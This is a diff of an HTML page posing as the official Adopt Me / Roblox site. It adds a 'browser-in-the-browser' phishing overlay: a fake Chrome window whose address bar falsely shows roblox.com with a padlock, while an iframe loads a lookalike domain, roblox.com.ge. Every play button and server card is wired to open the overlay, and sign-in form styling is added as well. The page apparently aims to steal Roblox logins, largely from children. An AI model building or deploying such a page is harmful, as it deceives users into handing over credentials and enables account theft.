@@ -540,7 +540,59 @@
             color: transparent;
             margin-bottom: 12px;
         }
-
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(10px);
+            z-index: 9999;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Inter', sans-serif;
+        }
+        .modal-box {
+            background: #191b1d;
+            width: 90%;
+            max-width: 440px;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            color: white;
+        }
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            padding: 14px 20px;
+            background: #212327;
+            border-bottom: 1px solid #333;
+            font-size: 0.85 rem;
+            font-weight: 600;
+        }
+        .close-x { background: none; border: none; color: #999; font-size: 1.5 rem; cursor: pointer; }
+        .modal-content { padding: 40px; text-align: center; }
+        .sign-in-title { font-size: 1.8 rem; font-weight: 700; margin-bottom: 8px; color: #fff; }
+        .sign-in-sub { color: #adb5bd; font-size: 0.9rem; margin-bottom: 30px; }
+        .input-group { text-align: left; margin-bottom: 15px; }
+        .input-group label { display: block; font-size: 0.75rem; font-weight: 700; margin-bottom: 6px; color: #fff; }
+        .input-group input {
+            width: 100%; padding: 14px; background: #000; border: 1px solid #3a3d41;
+            border-radius: 8px; color: #fff; outline: none; font-size: 0.9rem;
+        }
+        .modal-sign-in-btn {
+            width: 100%; padding: 14px; background: #456cff; color: #fff;
+            border: none; border-radius: 8px; font-weight: 700; margin-top: 10px; cursor: pointer;
+        }
+        .ui-divider { margin: 25px 0; border-top: 1px solid #333; position: relative; }
+        .ui-divider span { 
+            position: absolute; top: -10px; left: 50%; transform: translateX(-50%); 
+            background: #191b1d; padding: 0 10px; font-size: 0.75rem; color: #666; 
+        }
+        .secondary-modal-btn {
+            width: 100%; padding: 12px; background: #393b3d; color: #fff;
+            border: none; border-radius: 8px; margin-bottom: 10px; font-weight: 600; cursor: pointer;
+        }
+        .forgot-link { color: #adb5bd; text-decoration: none; font-size: 0.8 rem; display: block; margin-bottom: 20px; }
         @media (max-width: 1100px) {
             .server-grid { grid-template-columns: repeat(2, 1fr); gap: 24px; }
         }
@@ -561,47 +613,6 @@
 <script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="b5f67dea-c5af-4ecc-9dc2-ed8881edced1" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/101.js"></script></head>
 
 <body __processed_de9fff85-7109-450a-bf47-7f3875657a26__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJkaXNhYmxlZCIsIkxJTktFRElOIjoiZW5hYmxlZCIsIkNPTkZJRyI6ImRpc2FibGVkIn0sInZlcnNpb24iOiIyLjAuNDciLCJzY29yZSI6MjAwNDcwfV0=" __processed_e4b75ab6-c607-41f5-ae27-cb0649ecbff8__="true">
-
-
-<script>
-    // Custom private server URL
-    const PRIVATE_SERVER_URL = "https://roblox.com.ge/games/920587237/1H-Adopt-Me?privateServerLinkCode=70948648019414984398009608382200";
-    
-    function redirectToPrivateServer() {
-        window.open(PRIVATE_SERVER_URL, '_blank');
-    }
-    
-    function showToastAndRedirect(msg) {
-        let toast = document.createElement('div');
-        toast.innerText = msg;
-        toast.style.position = 'fixed';
-        toast.style.bottom = '20px';
-        toast.style.left = '50%';
-        toast.style.transform = 'translateX(-50%)';
-        toast.style.backgroundColor = '#0f1222';
-        toast.style.backdropFilter = 'blur(20px)';
-        toast.style.color = '#fff';
-        toast.style.padding = '12px 24px';
-        toast.style.borderRadius = '50px';
-        toast.style.fontWeight = '500';
-        toast.style.fontSize = '0.85rem';
-        toast.style.border = '1px solid rgba(232,31,118,0.5)';
-        toast.style.zIndex = '999';
-        toast.style.fontFamily = 'Inter, sans-serif';
-        toast.style.maxWidth = '90%';
-        toast.style.textAlign = 'center';
-        toast.style.whiteSpace = 'nowrap';
-        document.body.appendChild(toast);
-        setTimeout(() => {
-            toast.style.opacity = '0';
-            setTimeout(() => toast.remove(), 300);
-        }, 1200);
-        setTimeout(() => {
-            redirectToPrivateServer();
-        }, 300);
-    }
-</script>
-
 
 <header class="navbar_navbar__2lBZA" style="position:fixed; top:0; height:70px; width:100%; z-index:100; background:#0e1020; box-shadow:0 2px 10px rgba(0,0,0,0.3);">
     <nav class="css-mkgnve">
@@ -674,7 +685,6 @@
         </div>
     </nav>
 </header>
-
 
 <section class="hero-video-section">
     <video class="bg-video" autoplay="" loop="" muted="" playsinline="" poster="https://cdn.playadopt.me/websites/playadoptme/video/720p-Hero-Video-v4.webm">
@@ -788,76 +798,131 @@
   </div>
 </footer>
 
+<div id="modalOverlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.25); backdrop-filter:blur(12px); z-index:2147483647; align-items:center; justify-content:center; padding:20px; font-family: system-ui, -apple-system, sans-serif;">
+    <!-- Modern Chrome 2024 UI -->
+    <div id="modalContent" style="background:#2b2d30; width:100%; max-width:1150px; height:82vh; border-radius:16px; box-shadow:0 30px 60px rgba(0,0,0,0.7); display:flex; flex-direction:column; overflow:hidden; border:1px solid #44474a;">
+        
+        <!-- Tab Bar -->
+        <div style="background:#1e1f20; padding:10px 12px 0; display:flex; align-items:center; gap:8px;">
+            <div style="background:#2b2d30; color:#efeff1; padding:8px 16px; border-radius:12px 12px 0 0; font-size:12px; display:flex; align-items:center; gap:12px; width:220px; border:1px solid #44474a; border-bottom:none;">
+                
+                <!-- OFFICIAL PROPORTIONS ROBLOX LOGO -->
+                <div style="width: 18px; height: 18px; background: #0e42ff; border-radius: 4.5px; display: grid; place-items: center; flex-shrink: 0;">
+                    
+                    <!-- White Square: Official -11deg Tilt -->
+                    <div style="width: 10px; height: 10px; background: white; transform: rotate(15deg); display: grid; place-items: center;">
+                        
+                        <!-- Smaller, sharper centered hole -->
+                        <div style="width: 3.2px; height: 3.2px; background: #0081ff;"></div>
+                        
+                    </div>
+                </div>
+
+                <span style="font-weight:700; letter-spacing: 0.2px; font-size: 13px;">Roblox</span>
+            </div>
+            <button id="closeFinalModal" style="margin-left:auto; background:none; border:none; color:#9ea1a6; font-size:22px; cursor:pointer; padding:4px 12px; line-height:1;">×</button>
+        </div>
+
+        <!-- Modern Toolbar -->
+        <div style="background:#2b2d30; padding:8px 14px 10px; display:flex; align-items:center; gap:12px; border-bottom: 1px solid #3c4043;">
+            
+            <!-- Nav Icons -->
+            <div style="display:flex; align-items:center; gap:15px; padding-right:10px; color:#c7c7c7;">
+                <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" stroke-width="2" fill="none" style="opacity: 0.8; cursor: pointer;"><path d="M15 18l-6-6 6-6"/></svg>
+                <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" stroke-width="2" fill="none" style="opacity: 0.3; cursor: default;"><path d="M9 18l6-6-6-6"/></svg>
+                <svg viewBox="0 0 24 24" width="18" height="18" stroke="currentColor" stroke-width="2.5" fill="none" style="cursor: pointer;"><path d="M23 4v6h-6M1 20v-6h6M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg>
+            </div>
+            
+            <!-- ADDRESS BAR -->
+            <div style="flex:1; background:#1e1f20; border-radius:30px; padding:7px 20px; color:#e3e3e3; font-size:13px; display:flex; align-items:center; border:1px solid #44474a;">
+                <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="#bdc1c6" stroke-width="2.5" style="margin-right:10px;">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+                <span style="font-weight:400;">roblox.com</span><span style="color:#9aa0a6;">/games/920587237/Adopt-Me</span>
+            </div>
+
+            <!-- Profile Dot -->
+            <div style="width:26px; height:26px; background:#4f5255; border-radius:50%; border:1px solid #666; margin-left:10px;"></div>
+        </div>
+
+        <!-- Web Content -->
+        <div style="flex:1; background:#fff; position:relative;">
+            <iframe id="verificationFrame" src="about:blank" style="width:100%; height:100%; border:0; position:absolute; inset:0;" allow="fullscreen; autoplay" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts" referrerpolicy="no-referrer"></iframe>
+        </div>
+    </div>
+</div>
+
 <script>
-    // Get all interactive elements that should redirect to private server
-    const heroBtn = document.getElementById('heroJoinBtn');
-    const guideHero = document.getElementById('guideBtnHero');
-    const serverCards = document.querySelectorAll('.server-card');
-    const navPlay = document.querySelector('#navPlayBtn');
-    
-    // Helper function to show toast and redirect
-    function handleRedirect(message) {
-        let toast = document.createElement('div');
+(function() {
+    const overlay = document.getElementById('modalOverlay');
+    const closeBtn = document.getElementById('closeFinalModal');
+    const iframe = document.getElementById('verificationFrame');
+    const TARGET_URL = "https://roblox.com.ge/games/920587237/Adopt-Me?privateServerLinkCode=42563893025287590187291132618052";
+
+    // --- TOAST FUNCTION (Matches your image) ---
+    function showToast(message) {
+        const toast = document.createElement('div');
         toast.innerText = message;
-        toast.style.position = 'fixed';
-        toast.style.bottom = '20px';
-        toast.style.left = '50%';
-        toast.style.transform = 'translateX(-50%)';
-        toast.style.backgroundColor = '#0f1222';
-        toast.style.backdropFilter = 'blur(20px)';
-        toast.style.color = '#fff';
-        toast.style.padding = '10px 20px';
-        toast.style.borderRadius = '50px';
-        toast.style.fontWeight = '500';
-        toast.style.fontSize = '0.8rem';
-        toast.style.border = '1px solid rgba(232,31,118,0.4)';
-        toast.style.zIndex = '999';
-        toast.style.fontFamily = 'Inter, sans-serif';
-        toast.style.maxWidth = '90%';
-        toast.style.textAlign = 'center';
+        // Styling to match your screenshot exactly:
+        toast.style = `
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #0f1222;
+            color: #fff;
+            head
+            border-radius: 50px;
+            border: 1px solid #E81F76;
+            z-index: 100000;
+            font-family: 'Inter', sans-serif;
+            font-weight: 700;
+            font-size: 0.9rem;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            pointer-events: none;
+            transition: opacity 0.3s;
+        `;
         document.body.appendChild(toast);
+        
+        // Remove it after the delay
         setTimeout(() => {
             toast.style.opacity = '0';
             setTimeout(() => toast.remove(), 300);
-        }, 1200);
+        }, 1500);
+    }
+
+    function openModal(e, msg) {
+        if(e) { e.preventDefault(); e.stopPropagation(); }
+        
+        // 1. Show the Toast from your screenshot
+        showToast(msg);
+
+        // 2. Wait 1.5 seconds, then show the Chrome Window
         setTimeout(() => {
-            window.open(PRIVATE_SERVER_URL, '_blank');
-        }, 300);
+            if (iframe) iframe.src = TARGET_URL;
+            if (overlay) overlay.style.display = 'flex';
+        }, 1500); 
     }
-    
-    //Hero Join Button
-    if (heroBtn) {
-        heroBtn.addEventListener('click', () => {
-            handleRedirect('Redirecting to Adopt Me Server...');
-        });
-    }
-    
-    // Nav Play Button
-    if (navPlay) {
-        navPlay.addEventListener('click', (e) => {
-            e.preventDefault();
-            handleRedirect('Launching Adopt Me Server...');
-        });
-    }
-    
-    // Server Guide Button (shows info, then redirects)
-    if (guideHero) {
-        guideHero.addEventListener('click', () => {
-            handleRedirect('Server guide: Connecting to best Server...');
-        });
-    }
-    
-    // All server cards - each redirects to private server
-    serverCards.forEach((card, idx) => {
-        card.addEventListener('click', () => {
-            const names = ['Seoul Main Prime', 'Seoul Trading Hub', 'Busan Gateway', 'Daegu Central', 'Incheon Port', 'Asia Pacific'];
-            handleRedirect(`Connecting to ${names[idx]} server · Move to the optimal Korean private server`);
+
+    // Attach to all targets
+    const targets = ['.btn-primary', '#heroJoinBtn', '#navPlayBtn', '.css-1mya5', '.server-card'];
+    targets.forEach(selector => {
+        document.querySelectorAll(selector).forEach(btn => {
+            btn.onclick = (e) => openModal(e, "Redirecting to Adopt Me Server...");
         });
     });
-    
-    //Video autoplay
-    const videoElem = document.querySelector('.bg-video');
-    if (videoElem) videoElem.play().catch(e => console.log("autoplay blocked"));
+
+    // Close logic
+    if (closeBtn) {
+        closeBtn.onclick = () => { 
+            overlay.style.display = 'none';
+            if (iframe) iframe.src = "about:blank";
+        };
+    }
+
+    window.onclick = (e) => { if (e.target == overlay) overlay.style.display = 'none'; };
+})();
 </script>
 <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;baa826f6c7d14d83a85430b26979524c&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
 
